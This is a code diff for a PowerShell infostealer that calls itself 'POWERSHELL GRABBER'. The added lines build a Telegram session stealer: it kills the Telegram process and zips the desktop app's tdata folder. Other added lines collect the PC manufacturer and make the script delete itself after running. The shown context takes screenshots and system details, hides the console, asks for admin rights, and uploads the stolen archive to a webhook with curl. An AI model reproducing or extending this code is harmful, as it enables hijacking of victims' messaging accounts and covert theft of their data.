@@ -28,6 +28,8 @@ function EXFILTRATE-DATA {
     $hostname = $env:COMPUTERNAME
     $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
 	
+	$mfg = (gwmi win32_computersystem).Manufacturer 
+	
 	# System Uptime
 	function Get-Uptime {
     $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
@@ -67,9 +69,28 @@ function EXFILTRATE-DATA {
     
     Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
 
-    
+    # Telegram Session Stealer
+	
+	function telegramstealer {
+    $processName = "telegram"
+    try {
+        if (Get-Process $processName -ErrorAction SilentlyContinue) {
+            Get-Process -Name $processName | Stop-Process
+        }
+    } catch {
+     
+    }
+    $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
+    $destination = "$env:localappdata\temp\telegram-session.zip"
+    $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
+    $files = Get-ChildItem -Path $path -Exclude $exclude
+    Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest
+    }
+    telegramstealer
    
-
+    
+	# Desktop screenshot
+	
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
@@ -120,7 +141,7 @@ function EXFILTRATE-DATA {
                     },
                     @{
                         "name" = ":computer: Hardware"
-                        "value" = "``````Screen Size: $screen `nOS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
+                        "value" = "``````Screen Size: $screen `nOS: $osversion `nManufacturer: $mfg `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                     },
                     @{
                         "name" = ":floppy_disk: Disk"
@@ -184,6 +205,7 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
+	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" -ErrorAction SilentlyContinue
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip"
@@ -271,8 +293,10 @@ function Hide-Console
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
     Invoke-TASKS
+	Remove-Item $PSCommandPath -Force 
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
 }
+
